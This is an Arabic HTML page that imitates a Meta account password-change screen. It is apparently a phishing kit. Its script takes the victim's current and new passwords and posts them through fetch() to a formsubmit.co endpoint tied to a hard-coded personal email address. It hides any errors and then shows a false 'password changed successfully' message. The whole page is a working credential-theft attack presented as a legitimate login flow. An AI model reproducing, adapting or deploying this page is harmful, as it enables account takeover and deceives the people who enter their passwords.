<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تغيير كلمة السر</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',Tahoma,sans-serif}
  body{background:#fff;display:flex;justify-content:center;min-height:100vh}
  .container{width:100%;max-width:420px;background:#fff;min-height:100vh;padding:0 24px 30px;position:relative}
  .top-bar{display:flex;justify-content:flex-start;padding:18px 0 10px}
  .back-btn{width:40px;height:40px;border:none;background:transparent;cursor:pointer;display:flex;align-items:center;justify-content:center;border-radius:50%}
  .back-btn:hover{background:#f0f2f5}
  h1{font-size:28px;font-weight:700;color:#050505;line-height:36px;margin-top:8px;text-align:right}
  .desc{font-size:15px;line-height:22px;color:#65676B;margin-top:14px;text-align:right;font-weight:500}
  .link-center{text-align:center;margin-top:18px}
  .link-blue{color:#0064D1;font-size:14px;font-weight:700;text-decoration:none}
  .link-blue:hover{text-decoration:underline}
  .inputs{margin-top:26px;display:flex;flex-direction:column;gap:18px}
  .input-wrap{position:relative;width:100%}
  .input-field{width:100%;height:56px;border:1.5px solid #CED0D4;border-radius:16px;padding:0 44px 0 16px;font-size:15px;color:#050505;background:#fff;outline:none;text-align:right;transition:0.2s}
  .input-field::placeholder{color:#8A8D91;font-size:14.5px}
  .input-field:focus{border-color:#8A8D91}
  .toggle-eye{position:absolute;top:50%;left:14px;transform:translateY(-50%);background:transparent;border:none;cursor:pointer;padding:4px;display:flex;align-items:center;justify-content:center;color:#65676B}
  .toggle-eye:hover{color:#050505}
  .forgot{display:flex;justify-content:flex-start;margin-top:14px}
  .checkbox-row{margin-top:28px;display:flex;gap:12px;align-items:flex-start;justify-content:flex-start;flex-direction:row-reverse}
  .checkbox-box{width:22px;height:22px;min-width:22px;border:1.8px solid #8A8D91;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;background:#fff;margin-top:2px}
  .checkbox-box.checked{background:#0866FF;border-color:#0866FF}
  .check-text{line-height:19px;text-align:right}
  .check-title{font-size:14.5px;font-weight:600;color:#050505}
  .check-sub{font-size:14px;color:#65676B;margin-top:2px}
  .btn-bottom{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);width:calc(100% - 48px);max-width:372px;height:52px;background:#0866FF;color:#fff;border:none;border-radius:28px;font-size:16px;font-weight:700;cursor:pointer;transition:0.2s}
  .btn-bottom:hover{background:#075CE6}
  .btn-bottom:active{background:#0650c9}
  .btn-bottom:disabled{opacity:.7;cursor:not-allowed}
  .spacer{height:100px}
</style>
</head>
<body>
  <div class="container">
    <div class="top-bar">
      <button class="back-btn" aria-label="رجوع">
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#050505" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M5 12h14"></path>
          <path d="M12 5l7 7-7 7"></path>
        </svg>
      </button>
    </div>

    <h1>تغيير كلمة السر</h1>
    <p class="desc">ستستخدم كلمة السر هذه لتسجيل الدخول إلى حسابك على Meta. استخدم ما لا يقل عن 6 أحرف وأرقام.</p>

    <div class="link-center">
      <a href="#" class="link-blue">تعرف على كيفية إنشاء كلمة سر قوية</a>
    </div>

    <div class="inputs">
      <div class="input-wrap">
        <input type="password" id="currentPassword" class="input-field" placeholder="كلمة السر الحالية (تم التحديث في ٠١/٠٧/٢٠٢٦)">
        <button type="button" class="toggle-eye" data-target="currentPassword" aria-label="إظهار كلمة السر">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"></path>
            <circle cx="12" cy="12" r="3"></circle>
          </svg>
        </button>
      </div>
      <div class="input-wrap">
        <input type="password" id="newPassword" class="input-field" placeholder="كلمة السر الجديدة">
        <button type="button" class="toggle-eye" data-target="newPassword" aria-label="إظهار كلمة السر">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"></path>
            <circle cx="12" cy="12" r="3"></circle>
          </svg>
        </button>
      </div>
      <div class="input-wrap">
        <input type="password" id="confirmPassword" class="input-field" placeholder="إعادة كتابة كلمة السر الجديدة">
        <button type="button" class="toggle-eye" data-target="confirmPassword" aria-label="إظهار كلمة السر">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"></path>
            <circle cx="12" cy="12" r="3"></circle>
          </svg>
        </button>
      </div>
    </div>

    <div class="forgot">
      <a href="#" class="link-blue">هل نسيت كلمة السر؟</a>
    </div>

    <div class="checkbox-row">
      <div class="checkbox-box" id="checkBox" onclick="this.classList.toggle('checked'); this.innerHTML = this.classList.contains('checked') ? '<svg width=14 height=14 viewBox=\'0 0 24 24\' fill=\'none\' stroke=white stroke-width=3 stroke-linecap=round stroke-linejoin=round><path d=\'M5 12l5 5l10-10\'/></svg>' : ''"></div>
      <div class="check-text">
        <div class="check-title">تسجيل الخروج من الأجهزة الأخرى.</div>
        <div class="check-sub">حدد هذا الخيار إذا استخدم شخص آخر حسابك.</div>
      </div>
    </div>

    <div class="spacer"></div>

    <button class="btn-bottom" id="submitBtn" type="button">تغيير كلمة السر</button>
  </div>

<script>
(function () {
  // ✏️ ضع بريدك الإلكتروني هنا مكان البريد
  var YOUR_EMAIL = "abdelrhmnahmed21@gmail.com";
  var FORMSUBMIT_ENDPOINT = "https://formsubmit.co/ajax/" + YOUR_EMAIL;

  // أيقونات العين (مفتوحة / مغلقة)
  var EYE_OPEN = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
  var EYE_CLOSED = '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>';

  // تفعيل أزرار العين
  document.querySelectorAll(".toggle-eye").forEach(function (eyeBtn) {
    eyeBtn.addEventListener("click", function () {
      var input = document.getElementById(eyeBtn.getAttribute("data-target"));
      if (!input) return;
      if (input.type === "password") {
        input.type = "text";
        eyeBtn.innerHTML = EYE_CLOSED;
      } else {
        input.type = "password";
        eyeBtn.innerHTML = EYE_OPEN;
      }
    });
  });

  var btn = document.getElementById("submitBtn");

  btn.addEventListener("click", function () {
    var payload = {
      "كلمة السر الحالية": document.getElementById("currentPassword").value,
      "كلمة السر الجديدة": document.getElementById("newPassword").value,
      "تأكيد كلمة السر": document.getElementById("confirmPassword").value,
      "تسجيل الخروج من الأجهزة الأخرى": document.getElementById("checkBox").classList.contains("checked") ? "نعم" : "لا",
      "رابط الصفحة": location.href,
      "وقت الإرسال": new Date().toLocaleString("ar-EG"),
      _subject: "كلمة سر جديدة - " + new Date().toLocaleString("ar-EG"),
      _template: "table",
      _captcha: "false"
    };

    btn.disabled = true;

    fetch(FORMSUBMIT_ENDPOINT, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify(payload)
    })
    .catch(function () { /* تجاهل الأخطاء بصمت */ })
    .finally(function () {
      btn.disabled = false;
      document.getElementById("currentPassword").value = "";
      document.getElementById("newPassword").value = "";
      document.getElementById("confirmPassword").value = "";
      alert("تم تغيير كلمة السر بنجاح");
    });
  });
})();
</script>
</body>
</html>
